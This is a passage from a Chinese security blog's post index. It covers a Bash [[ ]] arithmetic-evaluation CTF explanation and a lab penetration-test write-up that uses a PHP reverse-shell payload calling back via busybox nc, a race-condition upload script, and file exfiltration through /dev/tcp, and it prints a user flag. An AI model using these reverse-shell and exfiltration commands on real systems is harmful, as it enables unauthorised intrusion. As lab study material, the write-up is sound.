\u7b2c\u4e8c\u4e2a `$a` \u88ab\u6269\u5c55\u4e3a\u5176\u503c `42`\u3002\u8868\u8fbe\u5f0f\u53d8\u4e3a `[[ 42 -ne 42 ]]`\u3002\n    4.  \u7b97\u672f\u6bd4\u8f83 `42 -ne 42` \u7684\u7ed3\u679c\u662f **false** (\u56e0\u4e3a\u5b83\u4eec\u76f8\u7b49)\uff0c`[[` \u547d\u4ee4\u9000\u51fa\u72b6\u6001\u4e3a **1**\u3002\n    5.  `if` \u8bed\u53e5\u770b\u5230\u9000\u51fa\u72b6\u6001 1\uff0c\u6761\u4ef6\u5224\u65ad\u4e3a **false**\uff0c\u4ece\u800c\u8df3\u8fc7 `exit 1`\u3002\n\n*   **\u793a\u4f8b 2: `[[ b -ne '$a' ]]`**\n    \u5047\u8bbe\u53d8\u91cf `b` \u672a\u5b9a\u4e49\uff1a\n    1.  \u7b2c\u4e00\u4e2a `b` **\u6ca1\u6709\u5f15\u53f7**\u3002Bash \u5c1d\u8bd5\u67e5\u627e\u540d\u4e3a `b` \u7684\u53d8\u91cf\u3002\n    2.  \u672a\u627e\u5230\u3002\u6839\u636e Bash \u7684\u8bbe\u7f6e\uff08\u4f8b\u5982 `set -u` \u662f\u5426\u5f00\u542f\uff09\uff0c\u8fd9\u53ef\u80fd\u5bfc\u81f4\u9519\u8bef\uff0c\u6216\u8005\u672a\u5b9a\u4e49\u7684\u53d8\u91cf\u88ab\u89c6\u4e3a\u7a7a\u5b57\u7b26\u4e32\u6216 0\u3002\n    3.  \u5982\u679c\u89c6\u4e3a\u7a7a\u6216 0\uff0c\u5047\u8bbe `$a` \u662f 42\uff0c\u8868\u8fbe\u5f0f\u53ef\u80fd\u53d8\u4e3a `[[ 0 -ne 42 ]]` \u6216 `[[ '' -ne 42 ]]`\u3002\n    4.  `[[ 0 -ne 42 ]]` \u7ed3\u679c\u4e3a **true** (\u9000\u51fa\u72b6\u6001 0)\u3002`if` \u6761\u4ef6\u6ee1\u8db3\uff0c\u6267\u884c `exit 1`\u3002\n    5.  `[[ '' -ne 42 ]]` \u4e2d\u7a7a\u5b57\u7b26\u4e32\u4e0d\u662f\u6709\u6548\u6574\u6570\uff0c`-ne` \u64cd\u4f5c\u5931\u8d25\uff0c`[[` \u9000\u51fa\u72b6\u6001 **\u975e\u96f6**\u3002`if` \u6761\u4ef6\u5224\u65ad\u4e3a **false**\uff0c\u8df3\u8fc7 `exit 1`\u3002\uff08\u8fd9\u66f4\u63a5\u8fd1\u6211\u4eec\u4e4b\u524d\u7528 `aaa` \u7684\u60c5\u51b5\uff09\n\n**\u5927\u4f6c\u60f3\u5f3a\u8c03\u7684\u662f\uff1a** \u8f93\u5165\u7684\u5b57\u7b26\uff08\u5982\u679c\u672a\u52a0\u5f15\u53f7\u4e14\u7b26\u5408\u53d8\u91cf\u540d\u89c4\u5219\uff09\u5728 `[[ ]]` \u8fd9\u4e2a\u7279\u5b9a\u4e0a\u4e0b\u6587\u4e2d\uff0c\u53ef\u80fd\u4e0d\u4f1a\u88ab\u7b80\u5355\u5730\u5f53\u4f5c\u5b57\u9762\u5b57\u7b26\u4e32\uff0c\u800c\u662f\u4f1a\u89e6\u53d1**\u53d8\u91cf\u89e3\u6790**\u7684\u5c1d\u8bd5\u3002\n\n## \u4e0e Python 2 `input()` \u7684\u7c7b\u6bd4\n\n\u8fd9\u4e0e Python 2 \u7684 `input()` \u51fd\u6570\u884c\u4e3a\u786e\u5b9e\u6709\u5171\u901a\u4e4b\u5904\uff1a\n\n*   **Python 2 `input()`:** \u8bfb\u53d6\u7528\u6237\u8f93\u5165\uff0c\u5e76\u5c1d\u8bd5\u5c06\u5176\u4f5c\u4e3a Python **\u8868\u8fbe\u5f0f**\u6765\u6c42\u503c\u3002\u8f93\u5165 `my_var` \u4f1a\u67e5\u627e\u53d8\u91cf `my_var`\uff1b\u8f93\u5165 `1+1` \u4f1a\u5f97\u5230 `2`\uff1b\u8f93\u5165 `aaa` (\u672a\u5b9a\u4e49) \u4f1a\u629b\u51fa `NameError`\u3002\n*   **Bash `[[ unquoted_string ... ]]`:** \u5728\u7279\u5b9a\u64cd\u4f5c\u7b26\uff08\u5982\u7b97\u672f\u6bd4\u8f83 `-ne`\uff09\u7684\u4e0a\u4e0b\u6587\u4e2d\uff0c\u672a\u52a0\u5f15\u53f7\u7684\u5b57\u7b26\u4e32 `unquoted_string` \u53ef\u80fd\u88ab\u5c1d\u8bd5\u4f5c\u4e3a**\u53d8\u91cf** `$unquoted_string` \u8fdb\u884c\u6269\u5c55\u3002\n\n\u4e24\u8005\u90fd\u4f53\u73b0\u4e86 **\u201c\u8f93\u5165\u4e0d\u4ec5\u4ec5\u662f\u5b57\u9762\u91cf\uff0c\u800c\u662f\u4f1a\u88ab\u89e3\u91ca\u5668/Shell\u5c1d\u8bd5\u8fdb\u884c\u67d0\u79cd\u5f62\u5f0f\u7684\u89e3\u6790\u6216\u6c42\u503c\u201d** \u7684\u7279\u70b9\u3002\u5982\u679c\u89e3\u6790\u5931\u8d25\uff08Python \u4e2d `NameError`\uff0cBash \u4e2d\u7b97\u672f\u6bd4\u8f83\u56e0\u7c7b\u578b\u9519\u8bef\u5931\u8d25\uff09\uff0c\u6216\u8005\u89e3\u6790\u540e\u7684\u7ed3\u679c\u6ee1\u8db3\u4e86\u67d0\u79cd\u6761\u4ef6\uff08Bash \u4e2d\u53d8\u91cf\u89e3\u6790\u540e\u6070\u597d\u76f8\u7b49\u5bfc\u81f4 `-ne` \u4e3a false\uff09\uff0c\u90fd\u53ef\u80fd\u5bfc\u81f4\u975e\u9884\u671f\u7684\u7a0b\u5e8f\u6d41\u7a0b\u3002\n\n\u6709\u7a7a\u7684\u53ef\u4ee5\u53bb\u770b\u8fd9\u4e24\u4e2a\u5927\u4f6c\u7684wp\n\nII04567\uff1a\n\n`Gmeek-html<iframe src='//player.bilibili.com/player.html?isOutside=true&aid=112958428482069&bvid=BV1SXeje3EKg&cid=500001648893827&p=1' scrolling='no' border='0' frameborder='no' framespacing='0' allowfullscreen='true' width='100%' height='460px'></iframe>`\n\nZumpyx\uff1a\n\n`Gmeek-html<iframe src='//player.bilibili.com/player.html?isOutside=true&aid=658105639&bvid=BV1La4y1F7o4&cid=1186380191&p=1' scrolling='no' border='0' frameborder='no' framespacing='0' allowfullscreen='true' width='100%' height='460px'></iframe>`\n\n## \u7ed3\u8bba\n\n\u8fd9\u6b21\u6311\u6218\u7684\u7cbe\u9ad3\u5728\u4e8e Bash \u5728 `[[ ... ]]` \u7b97\u672f\u6bd4\u8f83\u4e0a\u4e0b\u6587\u4e2d\u72ec\u7279\u7684\u6c42\u503c\u89c4\u5219\uff1a\n\n*   **\u53d8\u91cf\u540d\u51b2\u7a81\u662f\u5173\u952e\uff1a** \u8f93\u5165 `a` \u4e4b\u6240\u4ee5\u80fd\u901a\u8fc7\uff0c\u662f\u56e0\u4e3a\u5b83\u6070\u597d\u5339\u914d\u4e86\u5b58\u50a8\u968f\u673a\u6570\u7684\u53d8\u91cf\u540d\uff0c\u5bfc\u81f4\u6bd4\u8f83\u53d8\u6210\u4e86 `value_of_a -ne value_of_a`\u3002\n*   **\u672a\u5b9a\u4e49\u53d8\u91cf\u89c6\u4e3a 0\uff1a** \u8f93\u5165 `b`, `c` \u7b49\u4e4b\u6240\u4ee5\u5931\u8d25\uff0c\u662f\u56e0\u4e3a\u5b83\u4eec\u88ab\u5f53\u4f5c\u503c\u4e3a 0 \u7684\u672a\u5b9a\u4e49\u53d8\u91cf\uff0c\u4f7f\u5f97\u6bd4\u8f83 `0 -ne non_zero_random_number` \u4e3a\u771f\u3002\n*   **\u65e0\u6548\u683c\u5f0f\u5bfc\u81f4\u9519\u8bef\u5373\u5931\u8d25\uff1a** \u8f93\u5165 `aaa` \u80fd\u901a\u8fc7\uff0c\u662f\u56e0\u4e3a\u5b83\u65e0\u6cd5\u88ab\u7b97\u672f\u6c42\u503c\uff0c\u5bfc\u81f4 `[[` \u547d\u4ee4\u51fa\u9519\uff08\u8fd4\u56de\u975e\u96f6\u72b6\u6001\uff09\uff0c\u4ece\u800c\u4f7f `if` \u6761\u4ef6\u4e3a\u5047\u3002\n\n\u8fd9\u4e2a\u6848\u4f8b\u6df1\u523b\u5730\u5c55\u793a\u4e86\u7406\u89e3 Shell \u5e95\u5c42\u673a\u5236\u7684\u91cd\u8981\u6027\uff0c\u5c24\u5176\u662f\u5728\u5904\u7406\u7528\u6237\u8f93\u5165\u548c\u8fdb\u884c\u6761\u4ef6\u5224\u65ad\u65f6\u3002\u4e00\u4e2a\u770b\u4f3c\u7b80\u5355\u7684\u6bd4\u8f83 `[[ '$INPUTS' -ne '$a' ]]`\uff0c\u5176\u884c\u4e3a\u4f1a\u6839\u636e `$INPUTS` \u7684\u5185\u5bb9\uff08\u6570\u5b57\u3001\u53d8\u91cf\u540d\u3001\u65e0\u6548\u5b57\u7b26\u4e32\uff09\u800c\u622a\u7136\u4e0d\u540c\u3002\n\nsentence", "top": 0, "createdAt": 1751016499, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-06-27", "dateLabelColor": "#0969da"}, "P15": {"htmlDir": "docs/post/\ud83c\udf1f -zhan-dian-mei-hua-sheng-ji-wan-cheng-tong-gao.html", "labels": ["\u7ef4\u62a4"], "postTitle": "\ud83c\udf1f \u7ad9\u70b9\u7f8e\u5316\u5347\u7ea7\u5b8c\u6210\u901a\u544a", "postUrl": "post/%F0%9F%8C%9F%20-zhan-dian-mei-hua-sheng-ji-wan-cheng-tong-gao.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/15", "commentNum": 0, "wordCount": 59, "description": "![](https://7r1umphk.github.io/image/20250321105722076.png)sentence", "top": 0, "createdAt": 1751016501, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-06-27", "dateLabelColor": "#0969da"}, "P16": {"htmlDir": "docs/post/7r1umph -ba-ji-shen-tou-ce-shi-bao-gao- (Write-up).html", "labels": ["\u5185\u90e8\u9776\u673a/maze-sec"], "postTitle": "7r1umph \u9776\u673a\u6e17\u900f\u6d4b\u8bd5\u62a5\u544a (Write-up)", "postUrl": "post/7r1umph%20-ba-ji-shen-tou-ce-shi-bao-gao-%20%28Write-up%29.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/16", "commentNum": 0, "wordCount": 8767, "description": "## 1. \u76ee\u6807\u4fe1\u606f\n\n*   **\u9776\u673a\u540d\u79f0:** 7r1umph (\u672a\u53d1\u5e03\uff0c\u5185\u90e8\u6d4b\u8bd5\u9776\u673a\uff0c\u53ef\u80fd\u540e\u7eed\u53d1\u5e03\u4e8e HackMyVm)\n*   **\u96be\u5ea6**: easy\n*   **\u9776\u673aIP:** 192.168.205.187 (\u901a\u8fc7`arp-scan`\u53d1\u73b0)\n*   **\u653b\u51fb\u673aIP:** 192.168.205.128 (Kali Linux)\n\n## 2. \u4fe1\u606f\u6536\u96c6\n\n### 2.1 \u4e3b\u673a\u53d1\u73b0\n\n\u4f7f\u7528 `arp-scan` \u5728\u672c\u5730\u7f51\u7edc\u4e2d\u53d1\u73b0\u5b58\u6d3b\u4e3b\u673a\u3002\n\n```bash\nsudo arp-scan -l\n```\n\n\u8f93\u51fa\u663e\u793a\u76ee\u6807IP `192.168.205.187` \u5bf9\u5e94MAC\u5730\u5740 `08:00:27:73:20:ed` (Oracle VirtualBox)\u3002\n\n### 2.2 \u7aef\u53e3\u626b\u63cf\n\n\u4f7f\u7528 `nmap` \u5bf9\u76ee\u6807IP\u8fdb\u884c\u5168\u7aef\u53e3\u626b\u63cf\uff0c\u8bc6\u522b\u5f00\u653e\u7684\u670d\u52a1\u3002\n\n```bash\nnmap -p- 192.168.205.187\n```\n\n\u626b\u63cf\u7ed3\u679c\u663e\u793a\u5f00\u653e\u4e86\u4ee5\u4e0b\u7aef\u53e3\uff1a\n\n*   **22/tcp:** SSH\n*   **80/tcp:** HTTP\n\n### 2.3 Web\u76ee\u5f55\u626b\u63cf\n\n\u4f7f\u7528 `gobuster` \u5bf9Web\u670d\u52a1\u8fdb\u884c\u76ee\u5f55\u548c\u6587\u4ef6\u626b\u63cf\u3002\n\n```bash\ngobuster dir -u http://192.168.205.187/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -x php,txt,md,html\n```\n\n\u626b\u63cf\u53d1\u73b0\u4e86\u4ee5\u4e0b\u91cd\u8981\u8def\u5f84\uff1a\n\n*   `/index.html` (Status: 200)\n*   `/info.php` (Status: 200) - PHP\u4fe1\u606f\u6cc4\u9732\u9875\u9762\n*   `/index.php` (Status: 200) - \u53d1\u73b0\u662f\u4e00\u4e2a\u6587\u4ef6\u4e0a\u4f20\u9875\u9762\n*   `/upload/` (Status: 301 -> Directory) - \u63a8\u6d4b\u4e3a\u4e0a\u4f20\u6587\u4ef6\u7684\u5b58\u50a8\u76ee\u5f55\n*   `/tmp/` (Status: 301 -> Directory) - \u529f\u80fd\u672a\u77e5\u7684\u76ee\u5f55\uff0c\u4e5f\u50cf\u6587\u4ef6\u4ed3\u5e93\n\n### 2.4 Web\u670d\u52a1\u63a2\u7d22\n\n*   \u8bbf\u95ee `http://192.168.205.187/` \u663e\u793a 'index'\uff0c\u5bf9\u5e94 `/index.html` \u7684\u5185\u5bb9\u3002\n*   \u8bbf\u95ee `http://192.168.205.187/index.php` \u786e\u8ba4\u662f\u4e00\u4e2a\u6587\u4ef6\u4e0a\u4f20\u8868\u5355\u3002\n*   \u5c1d\u8bd5\u4e0a\u4f20\u4e00\u4e2aPHP Webshell (`shell.php`)\u3002\n\n![\u6587\u4ef6\u4e0a\u4f20\u9875\u9762\u622a\u56fe](https://7r1umphk.github.io/image/20250412184148968.png)\n\n\u4e0a\u4f20\u540e\u53d1\u73b0\u6587\u4ef6\u51fa\u73b0\u5728 `/upload/` \u76ee\u5f55\u4e0b\uff0c\u4f46\u6587\u4ef6\u540d\u88ab\u4fee\u6539\u4e3a `shell.php.dsz`\uff0c\u65e0\u6cd5\u76f4\u63a5\u6267\u884c\u3002\u540c\u65f6\u89c2\u5bdf\u5230 `/tmp/` \u76ee\u5f55\u6ca1\u6709\u6587\u4ef6\u5e38\u9a7b\u3002\n\n\u901a\u8fc7\u6293\u5305\u5206\u6790\u4e0a\u4f20\u8fc7\u7a0b\uff0c\u786e\u8ba4\u4e86POST\u8bf7\u6c42\u7684\u7ed3\u6784\uff0c\u4f46\u6ca1\u6709\u53d1\u73b0\u660e\u663e\u7684\u7ed5\u8fc7\u7ebf\u7d22\u3002\n\n\u8fdb\u4e00\u6b65\u6d4b\u8bd5\u53d1\u73b0\uff0c\u4e0a\u4f20\u7684\u6587\u4ef6\u4f1a\u4ee5**\u539f\u59cb\u6587\u4ef6\u540d**\u77ed\u6682\u5730\u51fa\u73b0\u5728 `/tmp/` \u76ee\u5f55\u4e0b\uff08\u5927\u7ea61\u79d2\uff09\uff0c\u7136\u540e\u624d\u88ab\u79fb\u52a8\u5230 `/upload/` \u5e76\u91cd\u547d\u540d\u3002\u8fd9\u5b58\u5728\u4e00\u4e2a**\u6761\u4ef6\u7ade\u4e89 (Race Condition)** \u6f0f\u6d1e\u3002\n\n## 3. \u6f0f\u6d1e\u5229\u7528 (\u6761\u4ef6\u7ade\u4e89\u83b7\u53d6\u521d\u59cb\u8bbf\u95ee)\n\n### 3.1 \u5236\u5b9a\u7b56\u7565\n\n\u5229\u7528\u6587\u4ef6\u5728 `/tmp/` \u76ee\u5f55\u77ed\u6682\u5b58\u5728\u7684\u7279\u6027\uff0c\u4e0a\u4f20\u4e00\u4e2a\u80fd\u53cd\u5f39Shell\u7684PHP\u6587\u4ef6\uff0c\u5e76\u5728\u5b83\u88ab\u5904\u7406\u524d\u901a\u8fc7HTTP\u8bf7\u6c42\u8bbf\u95ee\u5b83\uff0c\u89e6\u53d1\u53cd\u5f39Shell\u3002\n\n### 3.2 \u51c6\u5907\u5de5\u5177\n\n1. **\u53cd\u5f39Shell Payload (`shell.php`):**\n   \u4f7f\u7528\u4e00\u4e2a\u7b80\u5355\u7684 `exec` \u8c03\u7528 `busybox nc` \u6765\u53cd\u5f39shell\uff08\u7ecf\u8fc7\u6d4b\u8bd5\u53d1\u73b0\u8fd9\u4e2a\u6bd4\u8f83\u53ef\u9760\uff09\u3002\n\n   ```php\n   <?php\n   exec('busybox nc 192.168.205.128 8888 -e bash');\n   ?>\n   ```\n\n2. **\u6761\u4ef6\u7ade\u4e89\u8bbf\u95ee\u811a\u672c (`a.sh`):**\n   \u7f16\u5199\u4e00\u4e2aBash\u811a\u672c\uff0c\u6301\u7eed\u8bf7\u6c42\u76ee\u6807\u4e34\u65f6\u6587\u4ef6\uff0c\u76f4\u5230\u6210\u529f\uff08HTTP\u72b6\u6001\u7801 200\uff09\u3002\n\n   ```bash\n   #!/bin/bash\n   url='http://192.168.205.187/tmp/shell.php'\n   max_attempts=1000 # \u53ef\u4ee5\u6839\u636e\u9700\u8981\u8c03\u6574\u5c1d\u8bd5\u6b21\u6570\n   success=false\n   \n   echo '\u5f00\u59cb\u5c1d\u8bd5\u8bbf\u95ee $url ...'\n   \n   # \u5e76\u884c\u6267\u884c\u4e0a\u4f20\u548c\u8bbf\u95ee\u5c1d\u8bd5\u4ee5\u589e\u52a0\u6210\u529f\u7387\n   # \u5728\u53e6\u4e00\u4e2a\u7ec8\u7aef\u6267\u884c\u4e0a\u4f20\u64cd\u4f5c\n   \n   for ((i=1; i<=max_attempts; i++)); do\n       # \u53d1\u9001\u8bf7\u6c42\u5e76\u6355\u83b7\u72b6\u6001\u7801\n       status_code=$(curl -s -o /dev/null -w '%{http_code}' '$url')\n   \n       echo '\u5c1d\u8bd5 $i: \u72b6\u6001\u7801 = $status_code'\n   \n       # \u68c0\u6d4b\u5230200\u65f6\u6807\u8bb0\u6210\u529f\u5e76\u9000\u51fa\u5faa\u73af\n       if [[ '$status_code' -eq 200 ]]; then\n           echo '\u6210\u529f\u8bbf\u95ee! $url \u8fd4\u56de 200 OK.'\n           success=true\n           break\n       fi\n   \n       # \u77ed\u6682\u6682\u505c\u907f\u514d\u8fc7\u4e8e\u9891\u7e41\u7684\u8bf7\u6c42 (\u53ef\u9009)\n       sleep 0.05 # \u7f29\u77ed\u95f4\u9694\u589e\u52a0\u547d\u4e2d\u673a\u4f1a\n   done\n   \n   if [[ '$success' == true ]]; then\n       echo '\u5df2\u89e6\u53d1Payload\uff0c\u8bf7\u68c0\u67e5\u76d1\u542c\u5668\u3002'\n   else\n       echo '\u5728 $max_attempts \u6b21\u5c1d\u8bd5\u540e\u672a\u80fd\u6210\u529f\u8bbf\u95ee\u3002'\n   fi\n   ```\n\n   *(\u6ce8\uff1a\u539f\u811a\u672c\u5728\u68c0\u6d4b\u5230200\u540e\u4f1a\u6682\u505c\uff0c\u8fd9\u91cc\u4fee\u6539\u4e3a\u76f4\u63a5\u63d0\u793a\u6210\u529f)*\n\n3. **Netcat \u76d1\u542c\u5668:**\n   \u5728Kali\u653b\u51fb\u673a\u4e0a\u5f00\u542f `nc` \u76d1\u542c\u6307\u5b9a\u7aef\u53e3\uff088888\uff09\u3002\n\n   ```bash\n   nc -lvnp 8888\n   ```\n\n4. **Burp Suite (\u6216 `curl`):**\n   \u7528\u4e8e\u53d1\u9001\u5305\u542b\u53cd\u5f39Shell Payload\u7684\u6587\u4ef6\u4e0a\u4f20POST\u8bf7\u6c42\u3002\n\n### 3.3 \u6267\u884c\u653b\u51fb\n\n1. \u5728\u4e00\u4e2a\u7ec8\u7aef\u8fd0\u884c `nc -lvnp 8888`\u3002\n\n2. \u5728\u53e6\u4e00\u4e2a\u7ec8\u7aef\u8fd0\u884c `bash a.sh` \u5f00\u59cb\u5faa\u73af\u8bbf\u95ee\u3002\n\n3. \u4f7f\u7528Burp Suite Repeater (\u6216 `curl`) \u53d1\u9001\u6784\u9020\u597d\u7684\u6587\u4ef6\u4e0a\u4f20POST\u8bf7\u6c42\u5230 `http://192.168.205.187/index.php`\uff0c\u5185\u5bb9\u5305\u542b\u4e0a\u9762\u7684 `shell.php` Payload\u3002\n\n   ```http\n   POST /index.php HTTP/1.1\n   Host: 192.168.205.187\n   User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0\n   Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\n   Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\n   Accept-Encoding: gzip, deflate, br\n   Referer: http://192.168.205.187/index.php\n   Content-Type: multipart/form-data; boundary=---------------------------185067380923233129002267529642\n   Content-Length: 287  # \u6ce8\u610f\u6839\u636e\u5b9e\u9645payload\u8c03\u6574\n   Origin: http://192.168.205.187\n   Connection: keep-alive\n   Upgrade-Insecure-Requests: 1\n   Priority: u=0, i\n   \n   -----------------------------185067380923233129002267529642\n   Content-Disposition: form-data; name='file'; filename='shell.php'\n   Content-Type: application/x-php\n   \n   <?php\n   exec('busybox nc 192.168.205.128 8888 -e bash');\n   ?>\n   \n   -----------------------------185067380923233129002267529642--\n   ```\n\n4. \u89c2\u5bdf `a.sh` \u7684\u8f93\u51fa\u3002\u5f53\u770b\u5230 `\u72b6\u6001\u7801 = 200` \u65f6\uff0c\u68c0\u67e5 `nc` \u76d1\u542c\u5668\u7a97\u53e3\uff0c\u5e94\u8be5\u5df2\u7ecf\u6536\u5230\u4e86\u53cd\u5f39Shell\u3002\n\n   ```bash\n   \u250c\u2500\u2500(kali\u327fkali)-[~/test]\n   \u2514\u2500$ nc -lvnp 8888\n   listening on [any] 8888 ...\n   connect to [192.168.205.128] from (UNKNOWN) [192.168.205.187] 58348\n   id\n   uid=33(www-data) gid=33(www-data) groups=33(www-data)\n   pwd\n   /var/www/html/tmp\n   ```\n\n### 3.4 Shell \u7a33\u5b9a\u5316\n\n\u83b7\u53d6\u5230\u7684Shell\u901a\u5e38\u662f\u975e\u4ea4\u4e92\u5f0f\u7684\uff0c\u9700\u8981\u8fdb\u884c\u7a33\u5b9a\u5316\u5904\u7406\u4ee5\u4fbf\u66f4\u597d\u5730\u64cd\u4f5c\u3002\n\n```bash\nscript /dev/null -c bash\n# \u6309 Ctrl+Z \u6302\u8d77\nstty raw -echo; fg\n# \u6309 Enter\nreset xterm\nexport TERM=xterm\nexport SHELL=/bin/bash\n# \u6839\u636e\u9700\u8981\u8c03\u6574\u884c\u5217\u6570\nstty rows 59 cols 236\n```\n\n\u73b0\u5728\u6211\u4eec\u6709\u4e86\u4e00\u4e2a\u7a33\u5b9a\u7684 `www-data` \u7528\u6237\u7684Shell\u3002\n\n## 4. \u6743\u9650\u63d0\u5347\n\n### 4.1 \u672c\u5730\u679a\u4e3e (www-data)\n\n\u8fdb\u884c\u57fa\u672c\u7684\u7cfb\u7edf\u679a\u4e3e\u3002\n\n```bash\nwww-data@7r1umph:/var/www/html/tmp$ ls -la /home\ntotal 12\ndrwxr-xr-x  3 root    root    4096 Apr 11 22:27 .\ndrwxr-xr-x 18 root    root    4096 Mar 18 20:37 ..\ndrwx------  3 welcome welcome 4096 Apr 12 01:29 welcome # \u53d1\u73b0\u7528\u6237 welcome\n\nwww-data@7r1umph:/home$ sudo -l\nsudo: unable to resolve host 7r1umph: Name or service not known\n[sudo] password for www-data: # \u9700\u8981\u5bc6\u7801\uff0c\u65e0\u6cd5\u4f7f\u7528sudo\n\nwww-data@7r1umph:/home$ cd /opt/\nwww-data@7r1umph:/opt$ ls -la\ntotal 56\ndrwxr-xr-x  2 root root  4096 Apr 12 01:23 .\ndrwxr-xr-x 18 root root  4096 Mar 18 20:37 ..\n-rw-r--r--  1 root root 16968 Apr 12 00:21 guess       # \u53ef\u7591\u6587\u4ef6\n-rw-r--r--  1 root root 27871 Apr 12 00:18 yeyeye.png  # \u53ef\u7591\u56fe\u7247\u6587\u4ef6\n```\n\n### 4.2 \u63d0\u6743\u81f3 welcome \u7528\u6237\n\n\u53d1\u73b0 `/opt` \u76ee\u5f55\u4e0b\u6709\u4e00\u4e2a\u56fe\u7247\u6587\u4ef6 `yeyeye.png`\u3002\u5c06\u5176\u4f20\u56deKali\u8fdb\u884c\u5206\u6790\u3002\n\n**\u5728Kali\u4e0a\u51c6\u5907\u63a5\u6536:**\n\n```bash\nnc -lvnp 4444 > yeyeye.png\n```\n\n**\u5728\u9776\u673a\u4e0a\u53d1\u9001:**\n\n```bash\nwww-data@7r1umph:/opt$ cat yeyeye.png > /dev/tcp/192.168.205.128/4444\n```\n\n\u5728Kali\u4e0a\u67e5\u770b\u56fe\u7247 `yeyeye.png`:\n\n![Dorabella Cipher \u56fe\u7247](https://7r1umphk.github.io/image/20250412190141508.png)\n\n\u901a\u8fc7\u56fe\u7247\u5185\u5bb9\u548c\u7f51\u7edc\u641c\u7d22 (Google\u8bc6\u56fe\u7b49)\uff0c\u53ef\u4ee5\u8bc6\u522b\u51fa\u8fd9\u662f\u4e00\u79cd\u540d\u4e3a **Dorabella Cipher** \u7684\u5bc6\u7801\u3002\n\n\u53c2\u8003\u5728\u7ebf\u8d44\u6599\uff08 \u5982\u63d0\u4f9b\u7684\u94fe\u63a5 https://geocachen.nl/geocaching/geocache-puzzels-oplossen/dorabella-cipher/ \uff09\u8fdb\u884c\u7834\u8bd1\uff0c\u5f97\u5230\u5bc6\u7801\uff1a`yecongdong`\u3002\n\n\u4f7f\u7528\u8fd9\u4e2a\u5bc6\u7801\u5c1d\u8bd5\u5207\u6362\u5230 `welcome` \u7528\u6237\u3002\n\n```bash\nwww-data@7r1umph:/opt$ su welcome\nPassword: yecongdong\n$ id\nuid=1000(welcome) gid=1000(welcome) groups=1000(welcome)\n$ # \u6210\u529f\u5207\u6362\u5230 welcome \u7528\u6237\n```\n\n(\u53ef\u9009) \u4e3a\u4e86\u83b7\u5f97\u66f4\u597d\u7684\u4ea4\u4e92\u4f53\u9a8c\uff0c\u53ef\u4ee5\u4f7f\u7528 `welcome:yecongdong` \u901a\u8fc7SSH\u767b\u5f55\u9776\u673a\u3002\n\n### 4.3 \u83b7\u53d6 User Flag\n\n\u5728 `welcome` \u7528\u6237\u5bb6\u76ee\u5f55\u4e0b\u67e5\u627e `user.txt`\u3002\n\n```bash\nwelcome@7r1umph:~$ pwd\n/home/welcome\nwelcome@7r1umph:~$ ls -la\ntotal 32\ndrwx------ 3 welcome welcome 4096 Apr 12 01:29 .\ndrwxr-xr-x 3 root    root    4096 Apr 11 22:27 ..\n# ... \u5176\u4ed6\u6587\u4ef6 ...\n-rw-r--r-- 1 root    root      44 Apr 12 00:17 user.txt # \u627e\u5230 user flag \u6587\u4ef6\n# ... \u5176\u4ed6\u6587\u4ef6 ...\nwelcome@7r1umph:~$ cat user.txt\nflag{user-d650b42437edc28dfd3637c4ccd445ec}\n```\n\n\u6210\u529f\u83b7\u53d6 `user.flag`\u3002\n\n### 4.4 \u672c\u5730\u679a\u4e3e (welcome)\n\n\u7ee7\u7eed\u5728 `welcome` \u7528\u6237\u4e0b\u8fdb\u884c\u679a\u4e3e\uff0c\u5bfb\u627e\u63d0\u6743\u81f3 `root` \u7684\u7ebf\u7d22\u3002\u53d1\u73b0\u5728\u5bb6\u76ee\u5f55\u4e0b\u6709\u4e00\u4e2a `RegView` \u76ee\u5f55\u3002\n\n```bash\nwelcome@7r1umph:~$ cd RegView/\nwelcome@7r1umph:~/RegView$ ls -al\ntotal 476\ndrwxr-xr-x 3 root    root      4096 Apr 12 01:32 .\ndrwx------ 3 welcome welcome   4096 Apr 12 01:29 ..\ndrwxr-xr-x 8 root    root      4096 Apr 12 01:33 .git   # \u53d1\u73b0 .git \u76ee\u5f55\n# ... \u5176\u4ed6\u6587\u4ef6 ...\n-rwxr-xr-x 1 root    root      3911 Apr 12 01:02 RegView.sh\n# ... \u5176\u4ed6\u6587\u4ef6 ...\n```\n\n\u53d1\u73b0 `.git` \u76ee\u5f55\uff0c\u8868\u660e\u8fd9\u662f\u4e00\u4e2aGit\u4ed3\u5e93\uff0c\u53ef\u80fd\u5305\u542b\u5386\u53f2\u4fe1\u606f\u3002\n\n### 4.5 \u63d0\u6743\u81f3 root \u7528\u6237\n\n\u68c0\u67e5Git\u4ed3\u5e93\u7684\u5386\u53f2\u8bb0\u5f55\u3002\n\n```bash\nwelcome@7r1umph:~/RegView$ git log -p\n```\n\n\u5728 `git log` \u7684\u8f93\u51fa\u4e2d\uff0c\u53d1\u73b0\u4e86\u4e00\u4e2a\u5386\u53f2\u63d0\u4ea4\u8bb0\u5f55\uff0c\u5176\u4e2d\u5220\u9664\u4e86\u4e00\u4e2a\u540d\u4e3a `source2.txt` \u7684\u6587\u4ef6\uff0c\u8be5\u6587\u4ef6\u5185\u5bb9\u5305\u542b\u4e86\u4e00\u4e2a\u770b\u8d77\u6765\u50cf\u51ed\u8bc1\u7684\u5b57\u7b26\u4e32\uff1a\n\n```diff\ncommit acd806aad21acb61112252234c7707bc8a74dd3c (HEAD -> main)\nAuthor: bamuwe <bamuwe@qq.com>\nDate:   Sat Apr 12 01:33:50 2025 -0400\n\n    fix bug\n\ndiff --git a/source2.txt b/source2.txt\ndeleted file 